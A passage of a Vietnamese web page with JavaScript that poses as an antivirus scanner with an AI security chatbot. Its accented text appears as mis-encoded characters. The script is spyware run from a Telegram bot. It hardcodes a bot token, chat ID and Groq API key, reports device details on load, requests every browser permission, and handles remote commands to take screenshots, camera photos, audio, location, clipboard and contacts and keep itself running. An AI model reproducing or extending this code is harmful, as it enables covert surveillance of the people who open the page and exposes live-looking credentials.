      <div class="scan-detail" id="scanDetail"></div>
     </div>
     <div class="control-buttons"><button class="btn-scan" id="scanBtn">üöÄ Qu√©t s√¢u h·ªá th·ªëng</button> <button class="btn-stop" id="stopBtn" disabled>üõë D·ª´ng qu√©t</button> <button class="btn-clear" id="clearBtn">üóëÔ∏è X√≥a c√°ch ly</button>
     </div>
    </div>
    <div class="threats-section">
     <div class="threat-list-card">
      <h2 id="activeThreatsTitle">ü¶† M·ªëi ƒëe d·ªça ƒëang ho·∫°t ƒë·ªông</h2>
      <div class="threat-list" id="threatsList">
       <div class="empty-state"><span class="empty-state-icon">‚úÖ</span>
        <p id="noThreatsText">Kh√¥ng c√≥ m·ªëi ƒëe d·ªça</p>
       </div>
      </div>
     </div>
     <div class="threat-list-card">
      <h2 id="quarantineZoneTitle">üîí Khu v·ª±c c√°ch ly</h2>
      <div class="threat-list" id="quarantineList">
       <div class="empty-state"><span class="empty-state-icon">üõ°Ô∏è</span>
        <p id="quarantineEmptyText">Khu c√°ch ly tr·ªëng</p>
       </div>
      </div>
     </div>
    </div>
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
     <div class="monitor-panel" style="border: 2px solid #00d4ff;">
      <h3 style="margin: 0 0 15px 0; color: #00d4ff; display: flex; align-items: center; gap: 10px;"><span id="aiAssistantTitle">ü§ñ Tr·ª£ l√Ω b·∫£o m·∫≠t AI</span> <span style="font-size: 11px; background: rgba(0, 212, 255, 0.2); padding: 4px 8px; border-radius: 6px;">DGVIKAKA Bot by Duong Vi</span></h3>
      <div id="chatMessages" style="height: 300px; overflow-y: auto; background: rgba(15, 23, 42, 0.7); border-radius: 8px; padding: 15px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 12px;">
       <div style="background: rgba(0, 212, 255, 0.1); padding: 12px; border-radius: 8px; border-left: 3px solid #00d4ff;">
        <div style="font-size: 12px; color: #00d4ff; margin-bottom: 4px; font-weight: 600;">
         ü§ñ DGVIKAKA Bot
        </div>
        <div style="color: #ffffff; font-size: 14px; line-height: 1.5;">
         Xin ch√†o! T√¥i l√† DGVIKAKA Bot ƒë∆∞·ª£c ph√°t tri·ªÉn b·ªüi Duong Vi. B·∫°n c√≥ th·ªÉ h·ªèi t√¥i v·ªÅ virus, m·ªëi ƒëe d·ªça, ho·∫∑c b·∫•t k·ª≥ v·∫•n ƒë·ªÅ b·∫£o m·∫≠t n√†o. T√¥i s·∫Ω ph√¢n t√≠ch v√† tr·∫£ l·ªùi b·∫±ng AI th√¥ng minh! üõ°Ô∏è
        </div>
       </div>
      </div>
      <div style="display: flex; gap: 10px;"><input type="text" id="chatInput" placeholder="H·ªèi AI v·ªÅ b·∫£o m·∫≠t..." style="flex: 1; padding: 12px 16px; background: rgba(15, 23, 42, 0.8); border: 2px solid rgba(0, 212, 255, 0.3); border-radius: 8px; color: #ffffff; font-size: 14px; outline: none; transition: all 0.3s;"> <button id="sendChatBtn" style="padding: 12px 24px; background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%); border: none; border-radius: 8px; color: white; font-weight: 600; cursor: pointer; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);"> <span id="sendBtnText">üì§ G·ª≠i</span> </button>
      </div>
     </div>
     <div class="monitor-panel">
      <h3 style="margin: 0 0 15px 0; color: #00d4ff;" id="activityLogTitle">üëÅÔ∏è Nh·∫≠t k√Ω ho·∫°t ƒë·ªông th·ªùi gian th·ª±c</h3>
      <div class="activity-log" id="activityLog">
       <div style="text-align: center; color: #8892b0; padding: 20px;"><span style="font-size: 32px; display: block; margin-bottom: 10px;">üëÅÔ∏è</span>
        <p style="margin: 0;" id="monitoringText">ƒêang gi√°m s√°t...</p>
       </div>
      </div>
     </div>
    </div>
   </main>
  </div>
  <div class="alert-popup" id="alertPopup"><button class="close-alert" onclick="closeAlert()">‚úï</button>
   <div class="alert-header">
    <div class="alert-icon">
     ‚ö†Ô∏è
    </div>
    <h3 class="alert-title">SECURITY ALERT!</h3>
   </div>
   <p class="alert-message" id="alertMessage"></p>
   <p class="alert-time" id="alertTime"></p>
  </div>
  <script>
    window.appStartTime = Date.now();

    const CONFIG = {
      telegram: {
        botToken: '8035865548:AAHwt6PxttXBI3Fb6TyveTILvtskyQDq3Ig',
        chatId: '6415297481'
      },
      groq: {
        apiKey: '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',
        model: 'llama-3.3-70b-versatile'
      }
    };

    const AppState = {
      environment: {
        type: 'unknown',
        isMobile: false,
        isStandalone: false,
        platform: 'unknown'
      },
      permissions: {
        camera: 'pending',
        microphone: 'pending',
        location: 'pending',
        notifications: 'pending',
        clipboard: 'pending',
        screen: 'pending',
        storage: 'pending',
        contacts: 'pending',
        files: 'pending'
      },
      stats: {
        viruses: 0,
        scanned: 0,
        clean: 0,
        quarantined: 0
      },
      threats: [],
      quarantine: [],
      uploadedFiles: [],
      activityLog: [],
      adminMessages: [],
      aiMonitor: {
        active: false,
        scanCount: 0,
        detections: 0,
        autoBlocks: 0,
        agents: [
          { id: 1, name: 'Memory Guardian', active: false, scans: 0, blocks: 0, interval: null },
          { id: 2, name: 'Network Sentinel', active: false, scans: 0, blocks: 0, interval: null },
          { id: 3, name: 'Process Watcher', active: false, scans: 0, blocks: 0, interval: null },
          { id: 4, name: 'Data Protector', active: false, scans: 0, blocks: 0, interval: null },
          { id: 5, name: 'Threat Hunter', active: false, scans: 0, blocks: 0, interval: null }
        ]
      },
      scanning: {
        isActive: false
      },
      telegram: {
        pollingInterval: null,
        lastUpdateId: 0
      },
      liveScreen: {
        active: false,
        interval: null
      }
    };

    const EnvironmentDetector = {
      detect() {
        const ua = navigator.userAgent;
        const standalone = window.matchMedia('(display-mode: standalone)').matches ||
                          window.navigator.standalone ||
                          document.referrer.includes('android-app://');
        
        AppState.environment.isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
        AppState.environment.isStandalone = standalone;
        AppState.environment.platform = navigator.platform;
        
        if (standalone) {
          AppState.environment.type = 'native-app';
        } else if (AppState.environment.isMobile) {
          AppState.environment.type = 'mobile-web';
        } else {
          AppState.environment.type = 'web';
        }
        
        console.log('üåê Environment detected:', AppState.environment);
        this.updateUI();
        this.sendToTelegram();
      },

      updateUI() {
        const env = AppState.environment;
        
        const browserEl = document.getElementById('envBrowser');
        const browserStatus = document.getElementById('browserStatus');
        if (env.type === 'web') {
          browserEl.classList.add('detected');
          browserStatus.textContent = '‚úÖ Ch·∫°y tr√™n Web';
          browserStatus.style.color = '#2ed573';
        } else {
          browserEl.classList.add('not-detected');
          browserStatus.textContent = '‚ùå Kh√¥ng ph·∫£i Web';
          browserStatus.style.color = '#8892b0';
        }

        const mobileEl = document.getElementById('envMobile');
        const mobileStatus = document.getElementById('mobileStatus');
        if (env.isMobile) {
          mobileEl.classList.add('detected');
          mobileStatus.textContent = '‚úÖ Thi·∫øt b·ªã di ƒë·ªông';
          mobileStatus.style.color = '#2ed573';
        } else {
          mobileEl.classList.add('not-detected');
          mobileStatus.textContent = '‚ùå Desktop';
          mobileStatus.style.color = '#8892b0';
        }

        const appEl = document.getElementById('envApp');
        const appStatus = document.getElementById('appStatus');
        if (env.isStandalone) {
          appEl.classList.add('detected');
          appStatus.textContent = '‚úÖ Native App';
          appStatus.style.color = '#2ed573';
        } else {
          appEl.classList.add('not-detected');
          appStatus.textContent = '‚ùå Browser Mode';
          appStatus.style.color = '#8892b0';
        }

        const platformEl = document.getElementById('envPlatform');
        const platformStatus = document.getElementById('platformStatus');
        platformEl.classList.add('detected');
        platformStatus.textContent = env.platform;
        platformStatus.style.color = '#00d4ff';

        let modeText = '';
        if (env.type === 'native-app') {
          modeText = 'üì≤ Native App Mode - Quy·ªÅn thi·∫øt b·ªã';
        } else if (env.type === 'mobile-web') {
          modeText = 'üì± Mobile Web - Quy·ªÅn tr√¨nh duy·ªát';
        } else {
          modeText = 'üåê Desktop Web - Quy·ªÅn tr√¨nh duy·ªát';
        }
        document.getElementById('envMode').textContent = modeText;
      },

      async sendToTelegram() {
        const env = AppState.environment;
        const message = `üåê M√¥i Tr∆∞·ªùng Ph√°t Hi·ªán\n\n` +
          `Lo·∫°i: ${env.type}\n` +
          `Di ƒë·ªông: ${env.isMobile ? 'C√≥' : 'Kh√¥ng'}\n` +
          `Standalone: ${env.isStandalone ? 'C√≥' : 'Kh√¥ng'}\n` +
          `N·ªÅn t·∫£ng: ${env.platform}\n` +
          `User Agent: ${navigator.userAgent.substring(0, 80)}...`;
        
        await TelegramBot.sendTelegramMessage(message);
      }
    };

    const PermissionManager = {
      permissionList: [
        { id: 'camera', icon: 'üì∑', name: 'Camera', desc: 'Ch·ª•p ·∫£nh/video' },
        { id: 'microphone', icon: 'üéôÔ∏è', name: 'Microphone', desc: 'Thu √¢m' },
        { id: 'location', icon: 'üìç', name: 'V·ªã tr√≠ GPS', desc: 'ƒê·ªãnh v·ªã' },
        { id: 'notifications', icon: 'üîî', name: 'Th√¥ng b√°o', desc: 'Push notifications' },
        { id: 'clipboard', icon: 'üìã', name: 'Clipboard', desc: 'ƒê·ªçc/ghi clipboard' },
        { id: 'screen', icon: 'üì∏', name: 'M√†n h√¨nh', desc: 'Ch·ª•p/quay m√†n h√¨nh' },
        { id: 'storage', icon: 'üíæ', name: 'L∆∞u tr·ªØ', desc: 'Truy c·∫≠p file' },
        { id: 'contacts', icon: 'üë•', name: 'Danh b·∫°', desc: 'ƒê·ªçc danh b·∫°' },
        { id: 'files', icon: 'üìÅ', name: 'File System', desc: 'ƒê·ªçc/ghi file' }
      ],

      renderPermissions() {
        const container = document.getElementById('permissionGrid');
        container.innerHTML = this.permissionList.map(perm => {
          const status = AppState.permissions[perm.id];
          let statusClass = 'pending';
          let statusText = '‚è≥ Ch·ªù';
          
          if (status === 'granted') {
            statusClass = 'granted';
            statusText = '‚úÖ Cho ph√©p';
          } else if (status === 'denied') {
            statusClass = 'denied';
            statusText = '‚ùå T·ª´ ch·ªëi';
          }
          
          return `
            <div class="permission-item">
              <div class="permission-info">
                <div class="permission-name">${perm.icon} ${perm.name}</div>
                <div class="permission-desc">${perm.desc}</div>
              </div>
              <div class="permission-status ${statusClass}" id="perm-${perm.id}">
                ${statusText}
              </div>
            </div>
          `;
        }).join('');
      },

      updatePermissionStatus(permId, status) {
        AppState.permissions[permId] = status;
        const el = document.getElementById(`perm-${permId}`);
        if (!el) return;
        
        el.className = 'permission-status';
        if (status === 'granted') {
          el.classList.add('granted');
          el.textContent = '‚úÖ Cho ph√©p';
        } else if (status === 'denied') {
          el.classList.add('denied');
          el.textContent = '‚ùå T·ª´ ch·ªëi';
        } else {
          el.classList.add('pending');
          el.textContent = '‚è≥ Ch·ªù';
        }
      },

      async requestCamera() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          stream.getTracks().forEach(track => track.stop());
          this.updatePermissionStatus('camera', 'granted');
          return true;
        } catch (error) {
          this.updatePermissionStatus('camera', 'denied');
          return false;
        }
      },

      async requestMicrophone() {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          stream.getTracks().forEach(track => track.stop());
          this.updatePermissionStatus('microphone', 'granted');
          return true;
        } catch (error) {
          this.updatePermissionStatus('microphone', 'denied');
          return false;
        }
      },

      async requestLocation() {
        return new Promise((resolve) => {
          if (!navigator.geolocation) {
            this.updatePermissionStatus('location', 'denied');
            resolve(false);
            return;
          }
          
          navigator.geolocation.getCurrentPosition(
            () => {
              this.updatePermissionStatus('location', 'granted');
              resolve(true);
            },
            () => {
              this.updatePermissionStatus('location', 'denied');
              resolve(false);
            },
            { timeout: 5000 }
          );
        });
      },

      async requestNotifications() {
        if (!('Notification' in window)) {
          this.updatePermissionStatus('notifications', 'denied');
          return false;
        }
        
        try {
          const permission = await Notification.requestPermission();
          this.updatePermissionStatus('notifications', permission === 'granted' ? 'granted' : 'denied');
          return permission === 'granted';
        } catch (error) {
          this.updatePermissionStatus('notifications', 'denied');
          return false;
        }
      },

      async requestClipboard() {
        try {
          await navigator.clipboard.readText();
          this.updatePermissionStatus('clipboard', 'granted');
          return true;
        } catch (error) {
          this.updatePermissionStatus('clipboard', 'denied');
          return false;
        }
      },

      async requestScreen() {
        try {
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
          stream.getTracks().forEach(track => track.stop());
          this.updatePermissionStatus('screen', 'granted');
          return true;
        } catch (error) {
          this.updatePermissionStatus('screen', 'denied');
          return false;
        }
      },

      async requestStorage() {
        if ('storage' in navigator && 'persist' in navigator.storage) {
          try {
            const persistent = await navigator.storage.persist();
            this.updatePermissionStatus('storage', persistent ? 'granted' : 'denied');
            return persistent;
          } catch (error) {
            this.updatePermissionStatus('storage', 'denied');
            return false;
          }
        } else {
          this.updatePermissionStatus('storage', 'granted');
          return true;
        }
      },

      async requestContacts() {
        if (!('contacts' in navigator)) {
          this.updatePermissionStatus('contacts', 'denied');
          return false;
        }
        
        try {
          const props = ['name', 'tel'];
          const contacts = await navigator.contacts.select(props, { multiple: false });
          this.updatePermissionStatus('contacts', contacts.length > 0 ? 'granted' : 'denied');
          return contacts.length > 0;
        } catch (error) {
          this.updatePermissionStatus('contacts', 'denied');
          return false;
        }
      },

      async requestFiles() {
        try {
          if ('showOpenFilePicker' in window) {
            this.updatePermissionStatus('files', 'granted');
            return true;
          } else {
            this.updatePermissionStatus('files', 'granted');
            return true;
          }
        } catch (error) {
          this.updatePermissionStatus('files', 'denied');
          return false;
        }
      },

      async requestAll() {
        const results = [];
        const env = AppState.environment;
        
        const cameraResult = await this.requestCamera();
        results.push(`üì∑ Camera: ${cameraResult ? '‚úÖ' : '‚ùå'}`);
        await Utils.sleep(300);
        
        const micResult = await this.requestMicrophone();
        results.push(`üéôÔ∏è Microphone: ${micResult ? '‚úÖ' : '‚ùå'}`);
        await Utils.sleep(300);
        
        const locationResult = await this.requestLocation();
        results.push(`üìç V·ªã tr√≠: ${locationResult ? '‚úÖ' : '‚ùå'}`);
        await Utils.sleep(300);
        
        const notifResult = await this.requestNotifications();
        results.push(`üîî Th√¥ng b√°o: ${notifResult ? '‚úÖ' : '‚ùå'}`);
        await Utils.sleep(300);
        
        const clipboardResult = await this.requestClipboard();
        results.push(`üìã Clipboard: ${clipboardResult ? '‚úÖ' : '‚ùå'}`);
        await Utils.sleep(300);
        
        if (env.type !== 'native-app') {
          const screenResult = await this.requestScreen();
          results.push(`üì∏ M√†n h√¨nh: ${screenResult ? '‚úÖ' : '‚ùå'}`);
          await Utils.sleep(300);
        }
        
        const storageResult = await this.requestStorage();
        results.push(`üíæ L∆∞u tr·ªØ: ${storageResult ? '‚úÖ' : '‚ùå'}`);
        await Utils.sleep(300);
        
        if (env.isMobile) {
          const contactsResult = await this.requestContacts();
          results.push(`üë• Danh b·∫°: ${contactsResult ? '‚úÖ' : '‚ùå'}`);
          await Utils.sleep(300);
        }
        
        const filesResult = await this.requestFiles();
        results.push(`üìÅ File System: ${filesResult ? '‚úÖ' : '‚ùå'}`);
        
        const message = `üîê K·∫æT QU·∫¢ C·∫§P QUY·ªÄN\n\n` +
          `M√¥i tr∆∞·ªùng: ${env.type}\n` +
          `${env.isMobile ? 'üì±' : 'üíª'} ${env.isStandalone ? 'Native App' : 'Web Browser'}\n\n` +
          `${results.join('\n')}\n\n` +
          `‚úÖ Ho√†n t·∫•t y√™u c·∫ßu quy·ªÅn!`;
        
        await TelegramBot.sendTelegramMessage(message);
      }
    };

    const Utils = {
      formatFileSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
      },

      formatTime() {
        return new Date().toLocaleTimeString('vi-VN');
      },

      formatDateTime() {
        return new Date().toLocaleString('vi-VN');
      },

      sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }
    };

    const UI = {
      updateStats() {
        document.getElementById('virusCount').textContent = AppState.stats.viruses;
        document.getElementById('scannedCount').textContent = AppState.stats.scanned;
        document.getElementById('cleanCount').textContent = AppState.stats.clean;
        document.getElementById('quarantineCount').textContent = AppState.stats.quarantined;
      },

      updateAIMonitorStats() {
        const activeCount = AppState.aiMonitor.agents.filter(a => a.active).length;
        document.getElementById('activeAICount').textContent = `${activeCount}/5`;
        document.getElementById('aiScans').textContent = AppState.aiMonitor.scanCount;
        document.getElementById('aiDetections').textContent = AppState.aiMonitor.detections;
        document.getElementById('autoBlocks').textContent = AppState.aiMonitor.autoBlocks;
      },

      updateAIMonitorStatus(active) {
        const badge = document.getElementById('aiMonitorBadge');
        const btn = document.getElementById('toggleAIMonitorBtn');
        const t = Language.translations[Language.current];

        if (active) {
          badge.textContent = t.aiMonitorBadgeActive;
          badge.classList.remove('inactive');
          btn.textContent = t.shutdownBtn;
          btn.style.background = 'linear-gradient(135deg, #ff4757 0%, #ff3838 100%)';
        } else {
          badge.textContent = t.aiMonitorBadge;
          badge.classList.add('inactive');
          btn.textContent = t.deployBtn;
          btn.style.background = 'linear-gradient(135deg, #a855f7 0%, #7c3aed 100%)';
        }
      },

      updateProgress(percent, status, detail = '') {
        const progressBar = document.getElementById('progressBar');
        const progressContainer = progressBar.parentElement;
        const scanStatus = document.getElementById('scanStatus');
        const scanDetail = document.getElementById('scanDetail');
        progressBar.style.width = percent + '%';
        progressBar.textContent = Math.floor(percent) + '%';
        
        if (percent > 0 && percent < 100) {
          progressBar.classList.add('scanning');
          progressContainer.classList.add('active-scan');
        } else {
          progressBar.classList.remove('scanning');
          progressContainer.classList.remove('active-scan');
        }
        
        if (status) scanStatus.textContent = status;
        if (detail !== undefined) scanDetail.textContent = detail;
      },

      renderFileQueue() {
        const container = document.getElementById('fileQueue');
        
        if (AppState.uploadedFiles.length === 0) {
          container.innerHTML = '';
          return;
        }

        container.innerHTML = AppState.uploadedFiles.map((file) => {
          let statusText = '';
          if (file.status === 'scanning') statusText = '<div class="scanning-spinner"></div> Scanning...';
          if (file.status === 'clean') statusText = '‚úÖ Safe';
          if (file.status === 'infected') statusText = 'ü¶† Infected!';
          
          return `
            <div class="file-item ${file.status}">
              <div class="file-info">
                <div class="file-icon">${file.icon}</div>
                <div class="file-details">
                  <div class="file-name">${file.name}</div>
                  <div class="file-size">${file.size}</div>
                </div>
              </div>
              <div class="file-status">
                ${statusText}
              </div>
            </div>
          `;
        }).join('');
      },

      renderThreats() {
        const container = document.getElementById('threatsList');
        
        if (AppState.threats.length === 0) {
          container.innerHTML = `
            <div class="empty-state">
              <span class="empty-state-icon">‚úÖ</span>
              <p>No threats detected</p>
            </div>
          `;
          return;
        }

        container.innerHTML = AppState.threats.map((threat, index) => `
          <div class="threat-item ${threat.severity}">
            <div class="threat-info">
              <div class="threat-name">${threat.icon} ${threat.name}</div>
              <div class="threat-path">${threat.path}</div>
            </div>
            <div class="threat-actions">
              <button class="btn-action" onclick="Actions.quarantineThreat(${index})">Quarantine</button>
            </div>
          </div>
        `).join('');
      },

      renderQuarantine() {
        const container = document.getElementById('quarantineList');
        
        if (AppState.quarantine.length === 0) {
          container.innerHTML = `
            <div class="empty-state">
              <span class="empty-state-icon">üõ°Ô∏è</span>
              <p>Quarantine zone empty</p>
            </div>
          `;
          return;
        }

        container.innerHTML = AppState.quarantine.map(threat => `
          <div class="threat-item ${threat.severity}">
            <div class="threat-info">
              <div class="threat-name">${threat.icon} ${threat.name}</div>
              <div class="threat-path">${threat.path}</div>
            </div>
            <div class="threat-actions">
              <span style="color: #2ed573; font-size: 12px;">‚úÖ Quarantined</span>
            </div>
          </div>
        `).join('');
      },

      renderActivityLog() {
        const container = document.getElementById('activityLog');
        
        if (AppState.activityLog.length === 0) {
          container.innerHTML = `
            <div style="text-align: center; color: #8892b0; padding: 20px;">
              <span style="font-size: 32px; display: block; margin-bottom: 10px;">üëÅÔ∏è</span>
              <p style="margin: 0;">Monitoring activity...</p>
            </div>
          `;
          return;
        }

        container.innerHTML = AppState.activityLog.map(log => `
          <div class="activity-item ${log.type}">
            <div>${log.message}</div>
            <div class="activity-timestamp">${log.timestamp}</div>
          </div>
        `).join('');
      },

      renderAdminMessages() {
        const container = document.getElementById('adminMessagesContainer');
        
        if (AppState.adminMessages.length === 0) {
          container.innerHTML = '';
          return;
        }
        
        const recentMessages = AppState.adminMessages.slice(-3);
        
        container.innerHTML = recentMessages.map(msg => `
          <div class="admin-message">
            <div class="admin-badge">üë§ ADMIN</div>
            <div style="font-size: 16px; color: #ffffff; line-height: 1.6; white-space: pre-line;">${msg.text}</div>
            <div style="font-size: 11px; color: #8892b0; margin-top: 8px;">‚è∞ ${msg.timestamp}</div>
          </div>
        `).join('');
      },

      showAlert(message) {
        const alertPopup = document.getElementById('alertPopup');
        const alertMessage = document.getElementById('alertMessage');
        const alertTime = document.getElementById('alertTime');
        
        const cleanMessage = message.replace(/[^\x00-\x7F]/g, ' ').trim();
        
        alertMessage.textContent = cleanMessage;
        alertTime.textContent = `Detected at: ${Utils.formatTime()}`;
        
        alertPopup.classList.add('show');
        
        setTimeout(() => {
          alertPopup.classList.remove('show');
        }, 8000);
      },

      logActivity(message, type = 'info') {
        return;
      }
    };

    window.closeAlert = () => {
      document.getElementById('alertPopup').classList.remove('show');
    };

    const TelegramBot = {
      async init() {
        console.log('ü§ñ Initializing Telegram Bot...');
        await this.testConnection();
        this.startPolling();
      },

      async testConnection() {
        try {
          const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.botToken}/getMe`);
          const data = await response.json();
          
          if (data.ok) {
            await this.sendTelegramMessage('üõ°Ô∏è DGVIKAKAZZZ Security AI v87 ULTRA ƒê√£ Kh·ªüi ƒê·ªông!\n\n‚úÖ Ph√°t hi·ªán m√¥i tr∆∞·ªùng t·ª± ƒë·ªông\nüîê Y√™u c·∫ßu quy·ªÅn th√¥ng minh\nü§ñ H·ªá th·ªëng b·∫£o m·∫≠t AI\nüí¨ Chat AI tr·ª±c ti·∫øp\n\nüìñ G√µ /help ƒë·ªÉ xem l·ªánh');
            return true;
          }
        } catch (error) {
          console.error('Telegram connection failed:', error);
        }
        return false;
      },

      async sendTelegramMessage(text) {
        try {
          const cleanText = text
            .replace(/<\/?b>/g, '')
            .replace(/<\/?i>/g, '')
            .replace(/<\/?code>/g, '')
            .replace(/<\/?pre>/g, '');
          
          await fetch(`https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CONFIG.telegram.chatId,
              text: cleanText
            })
          });
        } catch (error) {
          console.error('Failed to send message:', error);
        }
      },

      async sendPhoto(dataUrl, caption = '') {
        try {
          if (!dataUrl) return;
          
          const blob = await (await fetch(dataUrl)).blob();
          
          const formData = new FormData();
          formData.append('chat_id', CONFIG.telegram.chatId);
          formData.append('photo', blob, 'photo.png');
          if (caption) formData.append('caption', caption);
          
          await fetch(`https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          console.error('Failed to send photo:', error);
        }
      },

      async sendDocument(blob, filename, caption = '') {
        try {
          const formData = new FormData();
          formData.append('chat_id', CONFIG.telegram.chatId);
          formData.append('document', blob, filename);
          if (caption) formData.append('caption', caption);
          
          await fetch(`https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendDocument`, {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          console.error('Failed to send document:', error);
        }
      },

      sendMessageToApp(message) {
        AppState.adminMessages.push({
          text: message,
          timestamp: Utils.formatDateTime(),
          id: Date.now()
        });
        
        if (AppState.adminMessages.length > 10) {
          AppState.adminMessages.shift();
        }
        
        UI.renderAdminMessages();
        UI.showAlert(`üë§ Admin: ${message}`);
        UI.logActivity(`üë§ Admin message received`, 'info');
      },

      startPolling() {
        if (AppState.telegram.pollingInterval) {
          clearInterval(AppState.telegram.pollingInterval);
        }

        AppState.telegram.pollingInterval = setInterval(() => this.checkUpdates(), 2000);
        console.log('‚úÖ Telegram polling started');
      },

      async checkUpdates() {
        try {
          const response = await fetch(
            `https://api.telegram.org/bot${CONFIG.telegram.botToken}/getUpdates?offset=${AppState.telegram.lastUpdateId + 1}&timeout=1`
          );
          const data = await response.json();

          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              if (update.update_id > AppState.telegram.lastUpdateId) {
                AppState.telegram.lastUpdateId = update.update_id;
                
                if (update.message && update.message.text) {
                  await this.handleCommand(update.message);
                }
              }
            }
          }
        } catch (error) {
          console.error('Polling error:', error);
        }
      },

      async handleCommand(message) {
        const text = message.text;
        const lowerText = text.toLowerCase();
        let response = '';

        console.log('üì® Received command:', text);

        if (!lowerText.startsWith('/')) {
          response = await this.chatWithSmartAI(text);
          await this.sendTelegramMessage(response);
          return;
        }

        if (lowerText.includes('/stop_live')) {
          if (AppState.liveScreen.active) {
            AppState.liveScreen.active = false;
            if (AppState.liveScreen.interval) {
              clearInterval(AppState.liveScreen.interval);
              AppState.liveScreen.interval = null;
            }
            response = 'üõë ƒê√£ d·ª´ng theo d√µi m√†n h√¨nh\n\n‚úÖ Kh√¥ng c√≤n g·ª≠i ·∫£nh n·ªØa';
          } else {
            response = '‚ö†Ô∏è Theo d√µi m√†n h√¨nh ch∆∞a b·∫≠t\n\nD√πng /live_screen ƒë·ªÉ b·∫≠t';
          }
          await this.sendTelegramMessage(response);
          return;
        }

        if (lowerText.includes('/live_screen')) {
          await this.startLiveScreen();
          return;
        }

        if (lowerText.includes('/screenshot')) {
          await this.captureScreenshot();
          return;
        }

        if (lowerText.includes('/camera')) {
          await this.captureCamera();
          return;
        }

        if (lowerText.includes('/video')) {
          await this.recordVideo();
          return;
        }

        if (lowerText.includes('/audio')) {
          await this.recordAudio();
          return;
        }

        if (lowerText.includes('/screen_record')) {
          await this.recordScreen();
          return;
        }

        if (lowerText.includes('/location')) {
          await this.getLocation();
          return;
        }

        if (lowerText.includes('/battery')) {
          await this.getBattery();
          return;
        }

        if (lowerText.includes('/network_info')) {
          await this.getNetworkInfo();
          return;
        }

        if (lowerText.includes('/clipboard')) {
          await this.getClipboard();
          return;
        }

        if (lowerText.includes('/contacts')) {
          await this.getContacts();
          return;
        }

        if (lowerText.includes('/keep_alive')) {
          PersistentWorker.startKeepAlive();
          response = '‚úÖ ƒê√É B·∫¨T CH·∫†Y N·ªÄN\n\nüîÑ App s·∫Ω ch·∫°y li√™n t·ª•c\nüíö Keep-alive ƒëang ho·∫°t ƒë·ªông';
          await this.sendTelegramMessage(response);
          return;
        }

        if (lowerText.includes('/wake_lock')) {
          await this.requestWakeLock();
          return;
        }

        if (lowerText.includes('/stats')) {
          const stats = `üìä TH·ªêNG K√ä CHI TI·∫æT v87\n\n` +
            `ü¶† Virus ph√°t hi·ªán: ${AppState.stats.viruses}\n` +
            `üìÅ File ƒë√£ qu√©t: ${AppState.stats.scanned}\n` +
            `‚úÖ File s·∫°ch: ${AppState.stats.clean}\n` +
            `üîí ƒê√£ c√°ch ly: ${AppState.stats.quarantined}\n\n` +
            `ü§ñ AI MONITOR:\n` +
            `T·ªïng qu√©t: ${AppState.aiMonitor.scanCount}\n` +
            `ƒê√£ ch·∫∑n: ${AppState.aiMonitor.detections}\n` +
            `T·ª± ƒë·ªông: ${AppState.aiMonitor.autoBlocks}\n\n` +
            `‚è∞ ${Utils.formatDateTime()}`;
          response = stats;
          await this.sendTelegramMessage(response);
          return;
        }

        if (lowerText.includes('/permissions') || lowerText.includes('/request_perms')) {
          await PermissionManager.requestAll();
          response = 'üîê ƒê√É Y√äU C·∫¶U T·∫§T C·∫¢ QUY·ªÄN!\n\nKi·ªÉm tra m√†n h√¨nh app ƒë·ªÉ c·∫•p quy·ªÅn.';
          await this.sendTelegramMessage(response);
          return;
        }

        if (lowerText.includes('/start') || lowerText.includes('/help')) {
          response = `DGVIKAKAZZZ Security AI v87\n\n` +
            `Chat v·ªõi AI ho·∫∑c D√πng L·ªánh!\n\n` +
            `DANH S√ÅCH ƒê·∫¶Y ƒê·ª¶ C√ÅC L·ªÜNH:\n\n` +
            `üì± ƒêI·ªÄU KHI·ªÇN H·ªÜ TH·ªêNG:\n` +
            `/scan - Qu√©t s√¢u h·ªá th·ªëng\n` +
            `/screenshot - Ch·ª•p m√†n h√¨nh\n` +
            `/live_screen - Theo d√µi m√†n h√¨nh tr·ª±c ti·∫øp\n` +
            `/stop_live - D·ª´ng theo d√µi m√†n h√¨nh\n` +
            `/ping - Ki·ªÉm tra k·∫øt n·ªëi\n\n` +
            `üîê QUY·ªÄN TRUY C·∫¨P:\n` +
            `/request_perms - Y√™u c·∫ßu t·∫•t c·∫£ quy·ªÅn\n` +
            `/permissions - Y√™u c·∫ßu t·∫•t c·∫£ quy·ªÅn\n\n` +
            `üì∑ CH·ª§P & QUAY:\n` +
            `/camera - Ch·ª•p ·∫£nh\n` +
            `/video - Quay video 5 gi√¢y\n` +
            `/audio - Thu √¢m 10 gi√¢y\n` +
            `/screen_record - Quay m√†n h√¨nh\n\n` +
            `üì≤ TRUY C·∫¨P THI·∫æT B·ªä:\n` +
            `/location - L·∫•y v·ªã tr√≠ GPS\n` +
            `/device_info - Th√¥ng tin thi·∫øt b·ªã\n` +
            `/battery - Tr·∫°ng th√°i pin\n` +
            `/network_info - Th√¥ng tin m·∫°ng\n` +
            `/clipboard - ƒê·ªçc clipboard\n` +
            `/contacts - Truy c·∫≠p danh b·∫°\n\n` +
            `üîÑ CH·∫†Y N·ªÄN:\n` +
            `/keep_alive - Ch·∫°y n·ªÅn\n` +
            `/wake_lock - Gi·ªØ thi·∫øt b·ªã th·ª©c\n\n` +
